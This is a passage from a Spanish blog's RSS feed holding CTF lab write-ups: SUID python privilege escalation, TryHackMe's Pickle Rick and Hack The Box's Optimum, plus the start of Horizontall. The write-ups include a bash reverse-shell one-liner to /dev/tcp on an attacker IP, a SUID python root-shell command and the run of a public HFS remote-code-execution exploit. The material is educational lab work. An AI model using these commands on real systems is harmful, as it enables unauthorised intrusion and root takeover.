+&lt;p&gt;El comando &lt;code&gt;find / -perm /4000&lt;/code&gt; lo que hace es buscar todos los programas con permiso SUID, en este caso python tiene permiso SUID&lt;/p&gt;
+&lt;p&gt;¿Qué es el permiso SUID?&lt;/p&gt;
+&lt;p&gt;Hay veces que es necesario que un programa se ejecute con los privilegios de su propietario en lugar de con los privilegios del usuario que lo ejecuta. Un ejemplo es el comando passwd, el cual necesita tener privilegios de root, ya que tiene que acceder a los ficheros /etc/passwd o /etc/shadow en modo escritura. Estos programas constituyen un peligro potencial en un sistema, ya que si se hace un mal uso de ellos y el propietario tiene privilegios, root, el que lo ejecuta podrá hacer en el sistema todo lo que el propietario del programa tenga permitido.&lt;/p&gt;
+&lt;p&gt;El comando &lt;code&gt;python -c &#39;import os; os.execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-p&amp;quot;)&#39;&lt;/code&gt; lo que hace es spawnear una bash y como python se ejecuta como root, la bash que spawnea es como root&lt;/p&gt;
+&lt;p&gt;Ahora ya podemos ver la flag con &lt;code&gt;cat /root/root.txt&lt;/code&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Resolución Pickle Rick</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-pickle-rick/</link>
+        <pubDate>Sat, 10 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-pickle-rick/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-pickle-rick/images/1.jpg" alt="Featured image of post Resolución Pickle Rick" /&gt;&lt;p&gt;Un CTF de Rick y Morty. ¡Ayuda a que Rick vuelva a ser humano!&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/picklerick&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/picklerick&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Este desafío temático de Rick y Morty requiere explotar un servidor web para encontrar 3 ingredientes que ayudarán a Rick a hacer su poción para transformarse de nuevo en un ser humano a partir de un pepinillo.&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.26.25&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ping -c 1 10.10.26.25
+PING 10.10.26.25 (10.10.26.25) 56(84) bytes of data.
+64 bytes from 10.10.26.25: icmp_seq=1 ttl=63 time=63.6 ms
+
+--- 10.10.26.25 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 63.615/63.615/63.615/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.26.25 -oG allPorts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPorts&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ extractPorts allPorts
+───────┬────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.26.25
+   5   │     [*] Open ports: 22,80
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ nmap -p22,80 -sC -sV 10.10.11.105
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d1ed3a0a8738271e3eafc898ea5b27 (RSA)
+|   256 7396d9e64c6a499612a1b46f571db2 (ECDSA)
+|_  256 669f61effb12c69123cbc6280a5d1a (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Rick is sup4r cool
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p22,80&lt;/td&gt;
+&lt;td&gt;Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sC&lt;/td&gt;
+&lt;td&gt;Para que realice scripts básicos de reconocimiento&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sV&lt;/td&gt;
+&lt;td&gt;Proporciona la versión e información de los servicios que corren por los puertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;De momento no hay nada raro&amp;hellip;&lt;/p&gt;
+&lt;h3 id=&#34;reconocimiento-web&#34;&gt;Reconocimiento web&lt;/h3&gt;
+&lt;p&gt;Al entrar a la web lo primero que se ve es lo siguiente&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-pickle-rick/images/web.png&#34;
+	width=&#34;1308&#34;
+	height=&#34;667&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-pickle-rick/images/web_hu9b80ccb1105af0368b02fd734261ad91_684716_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-pickle-rick/images/web_hu9b80ccb1105af0368b02fd734261ad91_684716_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;196&#34;
+		data-flex-basis=&#34;470px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;El texto traducido al español es:&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Ayuda Morty!&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Escucha Morty&amp;hellip; Necesito tu ayuda, me he vuelto a convertir en un pepinillo y esta vez no puedo volver a cambiar.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Necesito que BURRRP &amp;hellip;.Morty, inicia sesión en mi computadora y encuentra los últimos tres ingredientes secretos para terminar mi poción de pepinillo inverso. ¡El único problema es que no tengo idea de cuál era la contraseña BURRRRRRRRP ! ¡Ayuda Morty, ayuda!&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Con control + u se puede ver si hay algo en el codigo de la web.&lt;/p&gt;
+&lt;p&gt;En una línea se puede ver un comentario que contiene el nombre de un usuario&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;!--
+
+  Note to self, remember username!
+
+  Username: R1ckRul3s
+
+--&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;buscando-subdirectorios&#34;&gt;Buscando subdirectorios&lt;/h4&gt;
+&lt;p&gt;Para buscar subdirectorios e intentado con wfuzz (&lt;code&gt;wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.170:8080/FUZZ&lt;/code&gt;) y con gobuster (&lt;code&gt;gobuster -u 10.10.43.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir&lt;/code&gt;) pero tardaban mucho. Asi que probe con un script de nmap llamado http-enum&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ nmap -p80 --script=http-enum 10.10.43.4
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-11 01:05 CET
+Nmap scan report for 10.10.43.4
+Host is up (0.064s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /login.php: Possible admin folder
+|_  /robots.txt: Robots file
+
+Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;El nmap reporta 2: robots.txt y login.php&lt;/p&gt;
+&lt;h5 id=&#34;robotstxt&#34;&gt;robots.txt&lt;/h5&gt;
+&lt;p&gt;Al entrar a robots.txt solo se ve una frase &lt;code&gt;Wubbalubbadubdub&lt;/code&gt;&lt;/p&gt;
+&lt;h5 id=&#34;loginphp&#34;&gt;login.php&lt;/h5&gt;
+&lt;p&gt;Al entrar a login.php hay un panel para iniciar sesión, al poner el usuario del principio y la frase del robots.txt de contraseña se abre una página llamada portal.php que hay varias secciones, pero hay una que se llama commands en la cual se pueden ejecutar comandos&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-pickle-rick/images/portal.png&#34;
+	width=&#34;710&#34;
+	height=&#34;462&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-pickle-rick/images/portal_hu6367a3b4a33a905fa978a812a31fca64_23453_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-pickle-rick/images/portal_hu6367a3b4a33a905fa978a812a31fca64_23453_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;153&#34;
+		data-flex-basis=&#34;368px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;infiltración&#34;&gt;Infiltración&lt;/h2&gt;
+&lt;p&gt;Vamos a intentar crear una reverse shell mediante esa ejecución de comandos.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -nlvp 443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Para ponernos en escucha por el puerto 443&lt;/p&gt;
+&lt;p&gt;Ahora desde de la web vamos a intentar ejecutar lo siguiente:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;443 = Puerto en el que estamos en escucha
+10.10.10.10 = Ip de nuestra máquina&lt;/p&gt;
+&lt;p&gt;Pero no recibimos nada&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora si ya tenemos la reverse shell.&lt;/p&gt;
+&lt;h2 id=&#34;tratamiento-de-tty&#34;&gt;Tratamiento de tty&lt;/h2&gt;
+&lt;p&gt;Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;script /dev/null -c bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ctrl + z&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;stty raw -echo; fg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;reset
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export SHELL=bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export TERM=xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;flags&#34;&gt;&amp;ldquo;Flags&amp;rdquo;&lt;/h2&gt;
+&lt;p&gt;Para resolver la máquina necesitamos saber los tres ingredientes.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;El primero lo encontramos en el directorio &lt;code&gt;/var/www/html&lt;/code&gt; en un archivo llamado &lt;code&gt;Sup3rS3cretPickl3Ingred.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;El segundo está en &lt;code&gt;/home/rick&lt;/code&gt; en un archivo llamado &lt;code&gt;second ingredients&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;El último está en el directorio &lt;code&gt;/root&lt;/code&gt;, pero no tenemos acceso, al probar con un sudo su, no pide la contraseña y ya podemos visualizar el último ingrediente que está en un archivo llamado &lt;code&gt;3rd.txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>Resolución Máquina Optimum</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-optimum/</link>
+        <pubDate>Fri, 09 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-optimum/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-optimum/images/3.png" alt="Featured image of post Resolución Máquina Optimum" /&gt;&lt;p&gt;En este post explico paso por paso como hacer la máquina optimum de Hack The Box desde 0, es una máquina nivel Fácil, tiene windows y ya está retirada&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ping -c 1 10.10.10.8
+PING 10.10.10.8 (10.10.10.8) 56(84) bytes of data.
+64 bytes from 10.10.10.8: icmp_seq=1 ttl=127 time=37.6 ms
+
+--- 10.10.10.8 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 37.551/37.551/37.551/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;127&lt;/strong&gt;. Entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;, esta máquina es &lt;strong&gt;Windows&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ sudo nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.10.8 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-09 14:03 CET
+Initiating SYN Stealth Scan at 14:03
+Scanning 10.10.10.8 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.8
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPorts&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;El nmap a encontrado el puerto 80 (Este puerto es el que se usa para la navegación web de forma no segura HTTP)&lt;/p&gt;
+&lt;h3 id=&#34;whatweb&#34;&gt;Whatweb&lt;/h3&gt;
+&lt;p&gt;Con el whatweb podemos ver información sobre la web&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ whatweb 10.10.10.8
+http://10.10.10.8 [200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[10.10.10.8], JQuery[1.4.4], Script[text/javascript], Title[HFS /]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;searchsploit&#34;&gt;Searchsploit&lt;/h3&gt;
+&lt;p&gt;Con searchsploit podemos comprobar si existe algún exploit para el HFS versión 2.3 que reporto el whatweb&lt;/p&gt;
+&lt;h3 id=&#34;qué-es-hfs&#34;&gt;¿Qué es HFS?&lt;/h3&gt;
+&lt;p&gt;HTTP File Server, también conocido como HFS, es un servidor web gratuito diseñado específicamente para publicar y compartir archivos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ searchsploit HFS 2.3
+-------------------------------------------------------- ---------------------------------
+ Exploit Title                                          |  Path
+-------------------------------------------------------- ---------------------------------
+HFS (HTTP File Server) 2.3.x - Remote Command Execution | windows/remote/49584.py
+-------------------------------------------------------- ---------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;explotación-de-vulnerabilidades&#34;&gt;Explotación de Vulnerabilidades&lt;/h2&gt;
+&lt;p&gt;Si es vulnerable y hay un exploit en python. Con &lt;code&gt;searchsploit -m 49584.py&lt;/code&gt; lo pasamos a la ruta actual. Antes de usarlo hay que cambiar unas cosas del archivo.&lt;/p&gt;
+&lt;p&gt;En lhost y lport va el puerto en el que te quieres poner en escucha y la ip de tú máquina y en rhost y rport va la ip y el puerto de la máquina víctima&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;lhost = &amp;quot;10.10.14.2&amp;quot;
+lport = 443
+rhost = &amp;quot;10.10.10.8&amp;quot;
+rport = 80
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora ya se puede ejecutar con &lt;code&gt;python3 49584.py&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;listening on [any] 443 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.8] 49158
+
+PS C:\Users\kostas\Desktop&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;flags&#34;&gt;Flags&lt;/h2&gt;
+&lt;p&gt;Ya tenemos una consola interactiva con la 10.10.10.8, con un &lt;code&gt;cat user.txt&lt;/code&gt; tenemos la flag del user y con un &lt;code&gt;cat ../../Administrator/Desktop/root.txt&lt;/code&gt;tenemos la flag de root&lt;/p&gt;
+&lt;p&gt;¡¡¡Máquina resuelta!!!&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Resolución Máquina Horizontall</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/</link>
+        <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/11.png" alt="Featured image of post Resolución Máquina Horizontall" /&gt;&lt;p&gt;En este post voy a explicar paso por paso como hacer la máquina horizontall de Hack The Box desde 0, es una máquina nivel Fácil, tiene Linux y ya está retirada&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ping -c 1 10.10.11.105
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl de &lt;strong&gt;63&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/ping.png&#34;
+	width=&#34;607&#34;
+	height=&#34;150&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/ping_hu8b31a15267601668d60d01e80b1a7f08_19258_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/ping_hu8b31a15267601668d60d01e80b1a7f08_19258_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;404&#34;
+		data-flex-basis=&#34;971px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.11.105 -oG allPorts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPorts&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/extractPorts.png&#34;
+	width=&#34;420&#34;
+	height=&#34;235&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/extractPorts_hu00009b5ca6e16275fb874a8e18a551ec_17324_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/extractPorts_hu00009b5ca6e16275fb874a8e18a551ec_17324_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;178&#34;
+		data-flex-basis=&#34;428px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nmap -p22,80 -sC -sV 10.10.11.105 -oN target
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p22,80&lt;/td&gt;
+&lt;td&gt;Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sC&lt;/td&gt;
+&lt;td&gt;Para que realice scripts básicos de reconocimiento&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sV&lt;/td&gt;
+&lt;td&gt;Proporciona la versión e información de los servicios que corren por los puertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oN target&lt;/td&gt;
+&lt;td&gt;Para que lo guarde en el archivo target en formato nmap&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/nmap.png&#34;
+	width=&#34;909&#34;
+	height=&#34;370&#34;
